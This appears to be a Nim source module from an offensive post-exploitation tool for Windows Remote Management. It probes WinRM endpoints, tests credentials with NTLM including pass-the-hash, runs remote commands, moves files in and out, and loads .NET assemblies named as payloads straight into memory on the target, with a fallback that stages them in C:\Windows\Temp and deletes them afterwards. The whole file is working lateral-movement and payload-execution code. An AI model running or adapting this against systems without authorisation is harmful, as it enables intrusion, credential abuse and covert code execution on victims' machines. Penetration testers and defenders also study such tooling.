import std/[asyncdispatch, asyncnet, base64, net, os, random, strutils]
import ../../vendor/winrm as winrmlib
import ../smb/client as smbclient
import ../../core/proxy as netproxy

type
  WinRmProbe* = object
    host*: string
    port*: int
    reachable*: bool
    speaksWinRm*: bool
    statusCode*: int
    authHeader*: string
    serverHeader*: string
    message*: string

  WinRmCommandResult* = object
    host*: string
    port*: int
    success*: bool
    output*: string
    message*: string

  WinRmAuthMethod* = enum
    wamNtlm, wamKerberos

proc cleanError(error: ref Exception): string =
  error.msg.splitLines()[0]

proc cleanAssemblyOutput(output: string): string =
  var text = output
  let marker = "#< CLIXML"
  let idx = text.find(marker)
  if idx >= 0:
    text = text[0 ..< idx]
  while text.len > 0 and text[^1] in {'\r', '\n', ' ', '\t'}:
    text.setLen(text.len - 1)
  result = text

proc buildWinRmProbeRequest*(host: string; path = "/wsman"): string =
  "POST " & path & " HTTP/1.1\r\n" &
    "Host: " & host & "\r\n" &
    "Content-Length: 0\r\n" &
    "Connection: close\r\n\r\n"

proc headerValue(response, name: string): string =
  let wanted = name.toLowerAscii() & ":"
  for line in response.splitLines():
    let clean = line.strip()
    if clean.toLowerAscii().startsWith(wanted):
      return clean[wanted.len .. ^1].strip()

proc parseStatusCode(response: string): int =
  let firstLine = response.splitLines()[0]
  let parts = firstLine.splitWhitespace()
  if parts.len >= 2:
    try:
      return parseInt(parts[1])
    except ValueError:
      return 0

proc probeWinRm*(host: string; port, timeoutMs: int; path = "/wsman"): Future[WinRmProbe] {.async.} =
  var socket = newAsyncSocket()
  try:
    let connected = await netproxy.connectTcp(socket, host, port, timeoutMs)
    if not connected:
      return WinRmProbe(host: host, port: port, reachable: false, message: "timeout")

    await socket.send(buildWinRmProbeRequest(host, path))
    let recvFuture = socket.recv(2048)
    if not await withTimeout(recvFuture, timeoutMs):
      return WinRmProbe(host: host, port: port, reachable: true, message: "connected, receive timeout")

    let response = await recvFuture
    if response.len == 0:
      return WinRmProbe(host: host, port: port, reachable: true, message: "connected, no response")

    let statusCode = parseStatusCode(response)
    let auth = headerValue(response, "WWW-Authenticate")
    let server = headerValue(response, "Server")
    result = WinRmProbe(
      host: host,
      port: port,
      reachable: true,
      speaksWinRm: statusCode in [200, 401, 405],
      statusCode: statusCode,
      authHeader: auth,
      serverHeader: server,
      message: "HTTP response"
    )
  except CatchableError as error:
    result = WinRmProbe(host: host, port: port, reachable: false, message: cleanError(error))
  finally:
    socket.close()

const IdentifyBody = """<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" """ &
"""xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd">""" &
"""<s:Header/><s:Body><wsmid:Identify/></s:Body></s:Envelope>"""

proc httpSend(sock: Socket; host: string; port: int; path: string;
              authHeader: string; body: string;
              keepAlive: bool) =
  var req = "POST " & path & " HTTP/1.1\r\n"
  req.add "Host: " & host & ":" & $port & "\r\n"
  req.add "Content-Type: application/soap+xml;charset=UTF-8\r\n"
  req.add "User-Agent: Microsoft WinRM Client\r\n"
  req.add "Accept: */*\r\n"
  req.add "Connection: Keep-Alive\r\n"
  if authHeader.len > 0:
    req.add "Authorization: " & authHeader & "\r\n"
  req.add "Content-Length: " & $body.len & "\r\n"
  req.add "\r\n"
  req.add body
  sock.send(req)

proc httpReadResponse(sock: Socket; timeoutMs: int;
                      closeOnEof: bool): tuple[status: int, headers: string, body: string] =
  var raw = ""
  var headers = ""
  var chunk = newString(4096)
  while true:
    let split = raw.find("\r\n\r\n")
    if split >= 0:
      headers = raw[0 ..< split]
      raw = raw[split + 4 .. ^1]
      break
    let n = sock.recv(chunk, 4096, timeoutMs)
    if n <= 0:
      headers = raw
      raw = ""
      break
    raw.add chunk[0 ..< n]
  var status = 0
  if headers.len > 0:
    let firstLine = headers.splitLines()[0]
    let parts = firstLine.splitWhitespace()
    if parts.len >= 2:
      try: status = parseInt(parts[1]) except ValueError: discard
  var contentLength = -1
  for line in headers.splitLines():
    if line.toLowerAscii().startsWith("content-length:"):
      let v = line["content-length:".len .. ^1].strip()
      try: contentLength = parseInt(v) except ValueError: discard
      break
  if contentLength >= 0:
    while raw.len < contentLength:
      let n = sock.recv(chunk, min(4096, contentLength - raw.len), timeoutMs)
      if n <= 0: break
      raw.add chunk[0 ..< n]
  elif closeOnEof:
    while true:
      let n = sock.recv(chunk, 4096, timeoutMs)
      if n <= 0: break
      raw.add chunk[0 ..< n]
  result = (status, headers, raw)

proc probeWinRmSync*(host: string; port, timeoutMs: int; path = "/wsman"): WinRmProbe =
  let dialHost = netproxy.proxySocketHost(host)
  let af = if ':' in dialHost: Domain.AF_INET6 else: Domain.AF_INET
  var sock = newSocket(af, SockType.SOCK_STREAM, Protocol.IPPROTO_TCP, buffered = false)
  try:
    netproxy.connectTcpSync(sock, host, port, timeoutMs)
    sock.send(buildWinRmProbeRequest(host, path))
    let response =
      try:
        httpReadResponse(sock, timeoutMs, closeOnEof = true)
      except CatchableError as error:
        result = WinRmProbe(host: host, port: port, reachable: true,
          speaksWinRm: false, message: cleanError(error))
        return
    let auth = headerValue(response.headers, "WWW-Authenticate")
    let server = headerValue(response.headers, "Server")
    result = WinRmProbe(
      host: host,
      port: port,
      reachable: true,
      speaksWinRm: response.status in [200, 401, 405],
      statusCode: response.status,
      authHeader: auth,
      serverHeader: server,
      message: "HTTP response")
  except CatchableError as error:
    result = WinRmProbe(host: host, port: port, reachable: false,
      message: cleanError(error))
  finally:
    sock.close()

proc extractNegotiateToken(headers: string): string =
  for line in headers.splitLines():
    if line.toLowerAscii().startsWith("www-authenticate:"):
      let value = line["www-authenticate:".len .. ^1].strip()
      if value.toLowerAscii().startsWith("negotiate "):
        let token = value[10 .. ^1].strip()
        try: return base64.decode(token)
        except: discard
  return ""

proc randomBytes(count: int): string =
  randomize()
  for _ in 0 ..< count:
    result.add char(rand(255))

proc checkWinRmAuthFast*(host: string; port: int;
                         username, password, ntlmHash, domain: string;
                         path = "/wsman";
                         timeoutMs = 8000): WinRmCommandResult =
  result = WinRmCommandResult(host: host, port: port)
  let dialHost = netproxy.proxySocketHost(host)
  let af = if ':' in dialHost: Domain.AF_INET6 else: Domain.AF_INET
  var sock = newSocket(af, SockType.SOCK_STREAM, Protocol.IPPROTO_TCP, buffered = false)
  try:
    netproxy.connectTcpSync(sock, host, port, timeoutMs)
    try: sock.setSockOpt(OptNoDelay, true, level = cint(6))
    except CatchableError: discard
    let type1 = smbclient.spnegoNtlmInit(smbclient.buildNtlmType1(domain, ""))
    httpSend(sock, host, port, path,
      "Negotiate " & base64.encode(type1), IdentifyBody, keepAlive = true)
    let resp1 = httpReadResponse(sock, timeoutMs, closeOnEof = false)
    if resp1.status == 200:
      result.success = true
      result.message = "auth ok"
      return
    if resp1.status != 401:
      result.message = "unexpected HTTP " & $resp1.status & " on Type1"
      return
    let challengeBlob = extractNegotiateToken(resp1.headers)
    if challengeBlob.len == 0:
      result.message = "server did not return NTLM challenge"
      return
    let challenge = smbclient.parseNtlmChallenge(challengeBlob)
    if not challenge.offered:
      result.message = "could not parse NTLM challenge"
      return
    var cred = smbclient.SmbCredential(
      username: username, password: password,
      ntlmHash: ntlmHash, domain: domain
    )
    if cred.domain.len == 0:
      cred.domain = challenge.targetName
    let type3 = smbclient.buildNtlmType3WithSessionKey(
      cred, challenge, randomBytes(8))
    httpSend(sock, host, port, path,
      "Negotiate " & base64.encode(smbclient.spnegoNtlmAuth(type3.token)),
      IdentifyBody, keepAlive = false)
    let resp3 = httpReadResponse(sock, timeoutMs, closeOnEof = true)
    if resp3.status == 200:
      result.success = true
      result.message = "auth ok"
    elif resp3.status == 401:
      result.message = "auth rejected (HTTP 401) — wrong credentials or --domain"
    else:
      result.message = "HTTP " & $resp3.status & " on Identify"
  except CatchableError as error:
    result.message = cleanError(error)
  finally:
    sock.close()

proc isAuthFailure(msg: string): bool =
  let lower = msg.toLowerAscii()
  "401" in lower or "unauthorized" in lower or
    "auth failed" in lower or "authentication failed" in lower or
    "authorizationerror" in lower or
    "ntlm auth failed" in lower or
    "kerberos" in lower and "fail" in lower

proc tryWinRmAuthOnce(host: string; port: int;
                      username, password, ntlmHash, domain: string;
                      useSsl: bool;
                      authMethod: WinRmAuthMethod): WinRmCommandResult =
  var client = winrmlib.newClient(
    host, username, password, ntlmHash, "", domain,
    if authMethod == wamKerberos: winrmlib.amKerberos else: winrmlib.amNtlm,
    useSsl, port, winrmlib.meAuto
  )
  try:
    discard winrmlib.runCmdFast(client, "rem", isCmd = true)
    result = WinRmCommandResult(
      host: host, port: port, success: true, message: "auth ok"
    )
  except ValueError as error:
    result = WinRmCommandResult(
      host: host, port: port, success: false, message: cleanError(error)
    )
  except CatchableError as error:
    let msg = cleanError(error)
    let looksLikeInputError =
      msg.toLowerAscii().contains("hash") or
      msg.toLowerAscii().contains("must be") or
      msg.toLowerAscii().contains("invalid")
    if isAuthFailure(msg) or looksLikeInputError:
      result = WinRmCommandResult(
        host: host, port: port, success: false, message: msg
      )
    else:
      result = WinRmCommandResult(
        host: host, port: port, success: false, message: msg
      )
  finally:
    try: winrmlib.deleteShell(client)
    except CatchableError: discard

proc isTransientShellError(msg: string): bool =
  let stripped = msg.strip()
  "ShellId" in msg or "MaxConcurrentOperations" in msg or
    "MaxShellsPerUser" in msg or stripped.endsWith(":") or
    "timed out" in msg.toLowerAscii() or "connection" in msg.toLowerAscii()

proc isWinRmShellQuotaError(msg: string): bool =
  "ShellId" in msg or "MaxConcurrentOperations" in msg or
    "MaxShellsPerUser" in msg or "quota" in msg.toLowerAscii()

proc checkWinRmAuth*(
  host: string;
  port: int;
  username, password, ntlmHash, domain: string;
  useSsl = false;
  authMethod: WinRmAuthMethod = wamNtlm;
  attempts = 3
): WinRmCommandResult =
  let maxAttempts = max(1, attempts)
  for attempt in 1 .. maxAttempts:
    result = tryWinRmAuthOnce(host, port, username, password, ntlmHash,
      domain, useSsl, authMethod)
    if result.success: return
    if "401" in result.message or "Unauthorized" in result.message:
      result.message = "auth rejected (HTTP 401) — wrong credentials or --domain"
      return
    if not isTransientShellError(result.message) or attempt == maxAttempts:
      if isTransientShellError(result.message):
        if isWinRmShellQuotaError(result.message):
          result.success = true
          result.message = "shell create failed after " & $maxAttempts &
            " tries — auth ok, but server is out of shell quota"
        else:
          result.message = "shell create failed after " & $maxAttempts &
            " tries — server out of shell quota or WinRM rejecting"
      return
    sleep(700 * attempt)

proc runWinRmCommand*(
  host: string;
  port: int;
  username, password, ntlmHash, domain, command: string;
  useSsl = false;
  authMethod: WinRmAuthMethod = wamNtlm;
  timeoutMs = 0;
  forcePsrp = false
): WinRmCommandResult =
  var client = winrmlib.newClient(
    host,
    username,
    password,
    ntlmHash,
    "",
    domain,
    if authMethod == wamKerberos: winrmlib.amKerberos else: winrmlib.amNtlm,
    useSsl,
    port,
    winrmlib.meAuto
  )
  try:
    result = WinRmCommandResult(
      host: host,
      port: port,
      success: true,
      output:
        if forcePsrp:
          winrmlib.runCmd(client, command, false, true)
        else:
          winrmlib.runCmdFastOrPsrp(client, command),
      message: "command completed"
    )
  except CatchableError as error:
    var msg = cleanError(error)
    let stripped = msg.strip()
    if "401" in msg or "Unauthorized" in msg:
      msg = "auth rejected (HTTP 401) — wrong credentials or --domain"
    elif "ShellId" in msg or stripped.endsWith(":"):
      msg = "shell create failed — likely max shells per user reached, " &
        "or WinRM rejected the request"
    result = WinRmCommandResult(
      host: host,
      port: port,
      success: false,
      message: msg
    )
  finally:
    try:
      winrmlib.deleteShell(client)
    except CatchableError:
      discard

proc psQuotePath(path: string): string =
  "'" & path.replace("'", "''") & "'"

proc psQuote(text: string): string =
  "'" & text.replace("'", "''") & "'"

proc psArray(args: seq[string]): string =
  result = "@("
  for i, a in args:
    if i > 0:
      result.add ","
    result.add psQuote(a)
  result.add ")"

proc newTransferClient(host: string; port: int;
                       username, password, ntlmHash, domain: string;
                       useSsl: bool;
                       authMethod: WinRmAuthMethod): winrmlib.WinRMClient =
  winrmlib.newClient(
    host, username, password, ntlmHash, "", domain,
    if authMethod == wamKerberos: winrmlib.amKerberos else: winrmlib.amNtlm,
    useSsl, port, winrmlib.meAuto
  )

proc uploadFilePsrpChunks(client: var winrmlib.WinRMClient;
                          data, remotePath: string) =
  let init =
    "$p=" & psQuotePath(remotePath) & ";" &
    "$d=Split-Path -Parent $p;" &
    "if($d -and -not (Test-Path -LiteralPath $d)){" &
    "New-Item -ItemType Directory -Path $d -Force|Out-Null};" &
    "[IO.File]::Open($p,[IO.FileMode]::Create).Close();'ok'"
  let initOut = winrmlib.runCmd(client, init, false, true).strip()
  if initOut != "ok":
    raise newException(IOError, "PSRP upload init failed: " & initOut)
  const ChunkSize = 12288
  var offset = 0
  var chunkIdx = 0
  while offset < data.len:
    let stop = min(offset + ChunkSize, data.len)
    let b64 = base64.encode(data[offset ..< stop])
    let ps =
      "$p=" & psQuotePath(remotePath) & ";" &
      "$b=[Convert]::FromBase64String(" & psQuote(b64) & ");" &
      "$f=[IO.File]::Open($p,[IO.FileMode]::Append,[IO.FileAccess]::Write);" &
      "try{$f.Write($b,0,$b.Length)}finally{$f.Close()};'ok'"
    let chunkOut = winrmlib.runCmd(client, ps, false, true).strip()
    if chunkOut != "ok":
      raise newException(IOError, "PSRP upload chunk " & $chunkIdx & " failed: " & chunkOut)
    offset = stop
    inc chunkIdx
  let verify =
    "$p=" & psQuotePath(remotePath) & ";" &
    "if(Test-Path -LiteralPath $p){[int64](Get-Item -LiteralPath $p).Length}else{-1}"
  let sizeText = winrmlib.runCmd(client, verify, false, true).strip()
  var remoteSize = -1
  try: remoteSize = parseInt(sizeText)
  except ValueError: discard
  if remoteSize != data.len:
    raise newException(IOError, "PSRP upload size mismatch: " &
      $remoteSize & " of " & $data.len)

proc winRmUploadFile*(host: string; port: int;
                      username, password, ntlmHash, domain: string;
                      localPath, remotePath: string;
                      useSsl = false;
                      authMethod: WinRmAuthMethod = wamNtlm): WinRmCommandResult =
  result = WinRmCommandResult(host: host, port: port)
  if not fileExists(localPath):
    result.message = "local file not found: " & localPath
    return
  var client = newTransferClient(host, port, username, password, ntlmHash, domain,
    useSsl, authMethod)
  try:
    let data = readFile(localPath)
    let setup = "$p = " & psQuotePath(remotePath) & "; "
    try:
      winrmlib.uploadFileStream(client, data, setup, data.len)
    except CatchableError as streamError:
      let msg = streamError.msg.toLowerAscii()
      if "could not find shellid" notin msg and "access is denied" notin msg and
         "winrm error 500" notin msg and "not supported" notin msg and
         "winrs" notin msg:
        raise
      client.cmdShellDenied = true
      uploadFilePsrpChunks(client, data, remotePath)
    result.success = true
    result.message = "uploaded " & $data.len & " bytes"
    result.output = remotePath
  except CatchableError as error:
    result.success = false
    result.message = cleanError(error)
  finally:
    try: winrmlib.deleteShell(client)
    except CatchableError: discard

proc winRmDownloadFile*(host: string; port: int;
                        username, password, ntlmHash, domain: string;
                        remotePath, localPath: string;
                        useSsl = false;
                        authMethod: WinRmAuthMethod = wamNtlm): WinRmCommandResult =
  result = WinRmCommandResult(host: host, port: port)
  var client = newTransferClient(host, port, username, password, ntlmHash, domain,
    useSsl, authMethod)
  var outFile: File
  try:
    let setup = "$p = " & psQuotePath(remotePath) & "; "
    let sizeCmd = setup & "[int64]((Get-Item -LiteralPath $p).Length)"
    let sizeText = winrmlib.runCmdFastOrPsrp(client, sizeCmd, false).strip()
    var total = 0
    try: total = parseInt(sizeText)
    except ValueError: total = 0
    outFile = open(localPath, fmWrite)
    var written = 0
    if total > 0:
      winrmlib.drawProgress("download", 0, total)
    let script =
      "$ProgressPreference='SilentlyContinue';$ErrorActionPreference='Stop';" &
      setup &
      "$fs=[IO.File]::Open($p,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite);" &
      "try{$out=[Console]::OpenStandardOutput();$buf=New-Object byte[] 65536;" &
      "while(($n=$fs.Read($buf,0,$buf.Length)) -gt 0){$out.Write($buf,0,$n)}}finally{$fs.Close()}"
    discard winrmlib.runBinaryFastCached(client, script,
      proc(chunk: string) =
        outFile.write(chunk)
        inc written, chunk.len
        if total > 0:
          winrmlib.drawProgress("download", written, total)
    )
    if total > 0:
      winrmlib.drawProgress("download", total, total)
    result.success = true
    result.message = "downloaded " & $written & " bytes"
    result.output = localPath
  except CatchableError as error:
    result.success = false
    result.message = cleanError(error)
  finally:
    if outFile != nil:
      try: outFile.close()
      except CatchableError: discard
    try: winrmlib.deleteShell(client)
    except CatchableError: discard

proc executeManagedAssemblyFromMemory*(host: string; port: int;
                                       username, password, ntlmHash, domain: string;
                                       localPath: string; runArgs: seq[string];
                                       useSsl = false;
                                       authMethod: WinRmAuthMethod = wamNtlm): WinRmCommandResult =
  result = WinRmCommandResult(host: host, port: port)
  if not fileExists(localPath):
    result.message = "local file not found: " & localPath
    return
  let data = readFile(localPath)
  if not winrmlib.isManagedPe(data):
    result.message = "local file is a native PE, not a managed .NET assembly"
    return
  let b64 = base64.encode(data)
  let varName = "wrm_payload_" & winrmlib.genUuid().replace("-", "")
  var client = newTransferClient(host, port, username, password, ntlmHash, domain,
    useSsl, authMethod)
  try:
    discard winrmlib.runCmd(client, "$script:" & varName & " = New-Object System.Text.StringBuilder", false)
    var off = 0
    winrmlib.drawProgress("stage-mem", 0, b64.len)
    while off < b64.len:
      let stop = min(off + 196608, b64.len)
      discard winrmlib.runCmd(client,
        "[void]$script:" & varName & ".Append(" & psQuote(b64[off ..< stop]) & ")", false)
      off = stop
      winrmlib.drawProgress("stage-mem", off, b64.len)
    stdout.write("\n")
    flushFile(stdout)

    let cmd =
      "$ErrorActionPreference = 'Stop'; " &
      "$argv = " & psArray(runArgs) & "; " &
      "$b64 = $script:" & varName & ".ToString(); " &
      "$script:" & varName & " = $null; " &
      "$bytes = [Convert]::FromBase64String($b64); " &
      "$b64 = $null; " &
      "try { $asm = [Reflection.Assembly]::Load($bytes) } catch [BadImageFormatException] { throw 'payload is a native PE, not a managed .NET assembly; in-memory native PE execution requires a reflective PE loader' }; " &
      "$bytes = $null; " &
      "$entry = $asm.EntryPoint; " &
      "if($null -eq $entry){throw 'managed assembly has no entry point'}; " &
      "$params = $entry.GetParameters(); " &
      "if($params.Count -eq 0){$invokeArgs = New-Object 'object[]' 0} " &
      "elseif($params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]){$invokeArgs = New-Object 'object[]' 1; $invokeArgs[0] = [string[]]$argv} " &
      "else{throw ('unsupported entry point signature: ' + $entry.ToString())}; " &
      "$oldOut = [Console]::Out; $oldErr = [Console]::Error; " &
      "$out = New-Object IO.StringWriter; $err = New-Object IO.StringWriter; " &
      "try { [Console]::SetOut($out); [Console]::SetError($err); $ret = $entry.Invoke($null, $invokeArgs); if($ret -is [Threading.Tasks.Task]){$ret.GetAwaiter().GetResult()} } finally { [Console]::SetOut($oldOut); [Console]::SetError($oldErr) }; " &
      "$stdout = $out.ToString(); $stderr = $err.ToString(); if($stdout.Length -gt 0){$stdout}; if($stderr.Length -gt 0){$stderr}"
    let output = winrmlib.runCmd(client, cmd, false)
    if output.len > 0:
      result.output = cleanAssemblyOutput(output)
      if result.output.len > 0 and not result.output.endsWith("\n"):
        result.output.add "\n"
    result.success = true
    result.message = "assembly executed"
  except CatchableError as error:
    result.success = false
    result.message = cleanError(error)
  finally:
    try:
      discard winrmlib.runCmd(client, "$script:" & varName & " = $null; [GC]::Collect()", false)
    except CatchableError:
      discard
    try: winrmlib.deleteShell(client)
    except CatchableError: discard

proc runManagedAssemblyFromRemotePath*(host: string; port: int;
                                       username, password, ntlmHash, domain: string;
                                       remotePath: string; runArgs: seq[string];
                                       useSsl = false;
                                       authMethod: WinRmAuthMethod = wamNtlm): WinRmCommandResult =
  result = WinRmCommandResult(host: host, port: port)
  if remotePath.len == 0:
    result.message = "remote path must not be empty"
    return
  var client = newTransferClient(host, port, username, password, ntlmHash, domain,
    useSsl, authMethod)
  let setup = "$p = " & psQuotePath(remotePath) & "; "
  let cmd =
    "$ErrorActionPreference = 'Stop'; " &
    setup &
    "if(-not (Test-Path -LiteralPath $p -PathType Leaf)){throw ('remote file not found: ' + $p)}; " &
    "Set-Location -LiteralPath (Split-Path -Parent $p); " &
    "$argv = " & psArray(runArgs) & "; " &
    "try { $asm = [Reflection.Assembly]::Load([IO.File]::ReadAllBytes($p)) } catch [BadImageFormatException] { throw 'payload is a native PE, not a managed .NET assembly; in-memory native PE execution requires a reflective PE loader' }; " &
    "$entry = $asm.EntryPoint; " &
    "if($null -eq $entry){throw 'managed assembly has no entry point'}; " &
    "$params = $entry.GetParameters(); " &
    "if($params.Count -eq 0){$invokeArgs = New-Object 'object[]' 0} " &
    "elseif($params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]){$invokeArgs = New-Object 'object[]' 1; $invokeArgs[0] = [string[]]$argv} " &
    "else{throw ('unsupported entry point signature: ' + $entry.ToString())}; " &
    "$oldOut = [Console]::Out; $oldErr = [Console]::Error; " &
    "$out = New-Object IO.StringWriter; $err = New-Object IO.StringWriter; " &
    "try { [Console]::SetOut($out); [Console]::SetError($err); $ret = $entry.Invoke($null, $invokeArgs); if($ret -is [Threading.Tasks.Task]){$ret.GetAwaiter().GetResult()} } finally { [Console]::SetOut($oldOut); [Console]::SetError($oldErr) }; " &
    "$stdout = $out.ToString(); $stderr = $err.ToString(); if($stdout.Length -gt 0){$stdout}; if($stderr.Length -gt 0){$stderr}"
  try:
    let output = winrmlib.runCmd(client, cmd, false)
    if output.len > 0:
      result.output = cleanAssemblyOutput(output)
    result.success = true
    result.message = "assembly executed"
  except CatchableError as error:
    result.success = false
    result.message = cleanError(error)
  finally:
    try: winrmlib.deleteShell(client)
    except CatchableError: discard

proc looksLikeAssemblyFsDependencyError(output: string): bool =
  let lower = output.toLowerAscii()
  "fileiopermission" in lower or
  "internallreadallbytes" in lower or
  "internalreadallbytes" in lower or
  "could not find file" in lower or
  "the system cannot find the file specified" in lower or
  "path not found" in lower or
  "directorynotfoundexception" in lower

proc executeAssembly*(host: string; port: int;
                      username, password, ntlmHash, domain: string;
                      localPath: string; runArgs: seq[string];
                      useSsl = false;
                      authMethod: WinRmAuthMethod = wamNtlm): WinRmCommandResult =
  result = executeManagedAssemblyFromMemory(host, port, username, password, ntlmHash,
    domain, localPath, runArgs, useSsl, authMethod)
  if result.success and not looksLikeAssemblyFsDependencyError(result.output):
    return

  let stagedRemote = "C:\\Windows\\Temp\\" & extractFilename(localPath)
  var upload = winRmUploadFile(host, port, username, password, ntlmHash, domain,
    localPath, stagedRemote, useSsl, authMethod)
  if not upload.success:
    if result.success:
      return
    result = upload
    return
  let remoteRun = runManagedAssemblyFromRemotePath(host, port, username, password,
    ntlmHash, domain, stagedRemote, runArgs, useSsl, authMethod)
  if remoteRun.success or remoteRun.output.len > 0:
    result = remoteRun
  try:
    var cleanupClient = newTransferClient(host, port, username, password, ntlmHash, domain,
      useSsl, authMethod)
    discard winrmlib.runCmd(cleanupClient,
      "Remove-Item -LiteralPath " & psQuotePath(stagedRemote) & " -Force -ErrorAction SilentlyContinue",
      false)
    winrmlib.deleteShell(cleanupClient)
  except CatchableError:
    discard
